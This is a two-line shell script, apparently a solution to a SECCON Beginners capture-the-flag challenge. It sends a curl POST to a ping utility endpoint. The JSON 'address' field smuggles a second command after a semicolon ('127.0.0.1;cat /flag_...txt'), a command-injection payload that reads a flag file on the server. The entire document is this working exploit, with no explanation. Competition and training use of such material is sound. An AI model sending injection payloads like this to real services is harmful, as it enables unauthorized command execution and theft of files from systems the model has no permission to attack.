#!/bin/sh
curl -XPOST -H "Content-Type: application/json" -d '{"address":"127.0.0.1;cat /flag_A74FIBkN9sELAjOc.txt"}' https://util.quals.beginners.seccon.jp/util/ping
